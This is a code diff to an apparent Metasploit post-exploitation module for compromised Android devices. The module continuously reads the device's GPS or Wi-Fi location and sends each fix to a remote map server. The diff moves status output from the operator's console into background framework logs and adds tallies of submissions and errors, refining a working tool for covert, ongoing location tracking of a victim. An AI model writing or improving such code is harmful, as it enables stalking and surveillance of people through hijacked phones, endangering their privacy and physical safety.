@@ -29,6 +29,11 @@ class MetasploitModule < Msf::Post
     ])
   end
 
+  # The module is a Metasploit job, not an independent logging service.
+  # Framework messages go to framework.log; print_* would go to the shared
+  # console and interrupt the operator's Meterpreter interaction.
+  REPORT_INTERVAL = 60
+
   def run
     interval = datastore['INTERVAL']
     endpoint = datastore['ENDPOINT']
@@ -52,29 +57,25 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    print_status("Starting GPS stream to #{endpoint} (Interval: #{interval}s)...")
-    print_status("Recording run: #{track_id}")
-    print_status("Continuous streamer: use 'run -j' to keep msfconsole available.")
-    print_status("For background runs: 'jobs -l' lists jobs; 'jobs -k <JobID>' stops this job, not the session.")
+    counts = { accepted: 0, rejected: 0, unavailable: 0, errors: 0 }
+    previous = nil
+    last_report = Process.clock_gettime(Process::CLOCK_MONOTONIC)
+    ilog("[Cartochron] Started run=#{track_id} destination=#{uri.scheme}://#{uri.host}:#{uri.port} interval=#{interval}s")
 
     loop do
+      outcome = :unavailable
+      detail = nil
+
       begin
         locations = nil
-
         if client.respond_to?(:android)
-          # 1. Try standard GPS/Location provider geolocate first
           if client.android.respond_to?(:geolocate)
             locations = client.android.geolocate rescue nil
           end
 
-          # 2. Fallback to wlan_geolocate if primary geolocation returned nothing
           if (locations.nil? || locations.empty?) && client.android.respond_to?(:wlan_geolocate)
-            print_status("[GPS] Standard geolocate unavailable/empty, falling back to wlan_geolocate...")
             if api_key && !api_key.empty?
               locations = client.android.wlan_geolocate(api_key) rescue nil
-            else
-              # If wlan_geolocate requires an argument defined in the extension source
-              print_error("[GPS] wlan_geolocate requires an API_KEY option to be set.")
             end
           end
         end
@@ -87,23 +88,54 @@ class MetasploitModule < Msf::Post
           if lat && lon && lat.to_f != 0.0 && lon.to_f != 0.0
             response = submit_position(uri, lat.to_f, lon.to_f, map_user, map_password, track_id)
             if response.is_a?(Net::HTTPSuccess)
-              print_good("[GPS Sent] Lat: #{lat}, Lon: #{lon} | Status: #{response.code}")
+              outcome = :accepted
+              dlog("[Cartochron] Observation accepted run=#{track_id}", 'core', 2)
             else
-              print_error("[GPS] Map server rejected the observation: HTTP #{response.code}")
+              outcome = :rejected
+              detail = "HTTP #{response.code}"
             end
-          else
-            print_error("[GPS] Received empty or zero coordinate values.")
           end
-        else
-          print_error("[GPS] Geolocate returned no location data.")
         end
-
       rescue ::StandardError => e
-        print_error("[GPS Stream Error]: #{e.message}")
+        outcome = :errors
+        detail = e.class.to_s
       end
 
+      counts[outcome] += 1
+      state = [outcome, detail]
+      if state != previous
+        log_transition(track_id, state, previous)
+        previous = state
+      end
+
+      now = Process.clock_gettime(Process::CLOCK_MONOTONIC)
+      if now - last_report >= REPORT_INTERVAL
+        ilog("[Cartochron] Progress run=#{track_id} #{format_counts(counts)}")
+        last_report = now
+      end
       sleep(interval)
     end
+  ensure
+    ilog("[Cartochron] Stopped run=#{track_id} #{format_counts(counts)}") if counts
+  end
+
+  def log_transition(track_id, state, previous)
+    outcome, detail = state
+    case outcome
+    when :accepted
+      ilog("[Cartochron] Ingestion #{previous ? 'recovered' : 'established'} run=#{track_id}")
+    when :unavailable
+      wlog("[Cartochron] No usable location fix run=#{track_id}")
+    when :rejected
+      wlog("[Cartochron] Ingestion rejected run=#{track_id} #{detail}")
+    when :errors
+      elog("[Cartochron] Ingestion error run=#{track_id} type=#{detail}")
+    end
+  end
+
+  def format_counts(counts)
+    "accepted=#{counts[:accepted]} rejected=#{counts[:rejected]} " \
+      "unavailable=#{counts[:unavailable]} errors=#{counts[:errors]}"
   end
 
   def submit_position(uri, lat, lon, username, password, track_id = nil)
